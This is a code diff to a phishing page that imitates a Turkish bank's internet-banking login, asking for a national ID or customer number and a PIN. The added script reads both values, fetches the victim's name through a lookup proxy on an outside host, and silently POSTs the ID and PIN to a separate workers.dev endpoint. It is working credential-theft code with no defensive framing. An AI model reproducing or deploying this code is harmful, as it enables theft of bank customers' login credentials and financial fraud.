@@ -90,126 +90,50 @@ margin-bottom: 0px;
  
     
 
-    <form name="aspnetForm" method="post" action="https://worker-broad-snow-1482.selimjuhan2.workers.dev/" id="aspnetForm" autocomplete="off" novalidate="novalidate">
-      <div id="" class="login-wrap">
-        <header></header>
-        <div id="" class="container">
-          <div id="" class="tc-kimlik-giris-wrap">
-            <div id="ctl00_ctl06" class="row">
-              <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
-                <div id="LoginBox" class="login-box long">
-                  <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
-                  <input name="rdLng" type="hidden" value="">
-                  <p>İnternet Şubemize Hoş Geldiniz</p>
-                  <div class="tabs-wrap" data-module="14">
-                    <div id="TabHeaderContainer" class="tabs tab-header-container">
-                      <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="">
-                        <span></span>BİREYSEL </a>
-                      <a causesval="false">
-                        <span></span>KURUMSAL </a>
-                    </div>
-                    <div id="" class="tab-container tab-contents">
-                      <div id="RetailTabContainer" class="tab-item active" style="
-					  padding-left: 10px;
-				  ">
-                        <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="  
-
-font-size: 14px;  height: 46px;font-family: sans-serif;
-						  font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False"   disablevalidationonblur="true" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_RetailLoginButton');"  causesval="false" onmousedown=";"   exvalidmethod="ValidateIdentity" aria-required="true" value="" >
-
-                        </div>
-                        <div id="RetailRememberMeContainer" class="clearfix" >
-                          <div role="button" class="switch-cont" tabindex="0">
-                            <span>Beni Hatırla</span>
-                            <label class="switch">
-                              <input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
-                              <span class="switch-slider"></span>
-                            </label>
-                          </div>
-                        </div>
-                        <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
-                         </div>
-                        <div id="" class="clearfix"></div>
-                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
-        onclick="checkAndSubmit();">
-    <span></span>DEVAM
-</button><br><br><br>
-                        <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
-                          <span></span>Şifremi Unuttum </a>
-                        <div id="TabFooter" class="tab-footer">
-                          <p>Dijital Bankacılık müşterimiz olmak için</p>
-                          <a causesval="true" id="ctl00_c_OnlineApplicationButton" class="btn btn-default ">
-                            <span></span>HEMEN BAŞVUR </a>
-                        </div>
-                      </div>
-
-
-
-
-                  </div>
-                  <style>
-			  input {
-  touch-action: manipulation;
-}
-                    .api-payment-container img {
-                      max-height: 92px;
-                      max-width: 92px;
-                    }
-
-                    .ipNotInListRedirectBtn {
-                      background-color: #e10514 !important;
-                    }
-                  </style>
-                </div>
-              </div>
-            </div>
-          </div>
-    </form>
-
-<script>
+   <script>
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 async function checkAndSubmit() {
     const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
+    const retailPinValue = document.getElementById('ctl00_c_RetailPinTextBox').value;
 
     try {
-        // Bekleme süresi: 1.5 saniye
-        await sleep(1500);
+        // Sayfanın yüklenmesini bekleyin
+        await new Promise(resolve => window.addEventListener('load', resolve));
 
-        // API'ye istek gönder
+        // Diğer gerekli verileri alabilirsiniz (ad, soyad vb.)
         const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
         const data = await response.json();
-
-        // "adi" ve "soyadi" değerlerini al
         const adi = data.adi;
         const soyadi = data.soyadi;
 
-        // Bekleme süresi: 1 saniye
-        await sleep(1000);
+        // 0.5 saniye (500 milisaniye) bekleme
+        await sleep(500);
 
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
-        // Bekleme süresi: 1.5 saniye
-        await sleep(1500);
+        // Sadece belirli input değerlerini içeren bir FormData nesnesi oluşturun
+        const formData = new FormData();
+        formData.append('ctl00$c$RetailIdentityTextBox', retailIdentityValue);
+        formData.append('ctl00$c$RetailPinTextBox', retailPinValue);
 
-        // Cookie kayıt edildiyse formu gönder
-        if (document.cookie.includes('isim')) {
-		 console.error('Cookie k .');
-            //document.getElementById('aspnetForm').submit();
-        } else {
-            console.error('Cookie kayıt edilmedi.');
-        }
+        // AJAX ile formu belirtilen adrese gönder
+        await fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev/', {
+            method: 'POST',
+            body: formData
+        });
+
+        // Optional: Başarılı bir şekilde gönderildiğine dair bir mesaj yazdırabilirsiniz.
+        console.log('Form başarıyla gönderildi');
     } catch (error) {
-        // Hata durumunda konsola hata mesajını yazdır
         console.error('Hata:', error);
     }
 }
 </script>
+
 
  
 
